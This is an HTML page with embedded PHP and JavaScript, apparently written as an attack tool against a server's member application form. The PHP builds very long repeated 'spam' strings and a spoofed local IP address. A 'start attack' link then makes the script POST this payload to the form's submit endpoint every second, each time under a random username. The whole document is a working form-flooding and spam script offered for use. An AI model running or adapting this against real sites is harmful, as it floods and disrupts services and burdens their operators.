<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
	<title>MRT Server Member Application</title>

<?php
	$spam = "spam";
	for( $i = 0; $i != 5; ++ $i )
		$spam = "$spam$spam$spam$spam$spam";
	$payload = "&email=$spam&age=1&location=$spam" .
		"&heardof=other&heardof_other=$spam&links=$spam" .
		"&reasons=$spam&ipAddress=127.0.0.1";
?>

	<script type="text/javascript">

		// Create an ajax object
		createAjaxObject = function() {
			if( XMLHttpRequest ) {
				return new XMLHttpRequest();
			}
			else {
				try {
					return new ActiveXObject("Msxml2.XMLHTTP");
				} catch( e ) {
					return new ActiveXObject("Microsoft.XMLHTTP");
				}
			}
			return null;
		}

		// Do an ajax post call
		doAjaxPost = function( target, post, callback ) {
			var ajax = createAjaxObject();
			if( ! ajax ) {
				callback( null );
				return false;
			}

			ajax.onreadystatechange = 
				function(){
					if( ajax.readyState == 4 ) {
						if( ajax.status == 200 )
							callback( ajax );
						else
							callback( false );
					}
				};

			ajax.open( "POST", target, true );

			ajax.setRequestHeader( "Content-Type",
				"application/x-www-form-urlencoded" );
			/*ajax.setRequestHeader( "Content-Length", 
				post.length );
			ajax.setRequestHeader( "Connection", 
				"close" );*/

			ajax.overrideMimeType( "text/xml; charset=utf-8" );

			ajax.send( post );

			return ajax;
		}

		// On start attack
		onStart = function()
		{
			payload = "<?php echo $payload; ?>";
			setInterval( function() {
					var userid = Math.random();
					doAjaxPost( "../submit.php", "username=" + userid + payload, function(){} );
				}, 
				1000 );
			document.getElementById("contents").innerHTML = "attacking...";
		}
	</script>

	<!-- Javascript -->


<body>
	<div id="contents">
		<a onclick="onStart()">Click here to start attack</a>
	</div>
</body>

</html>
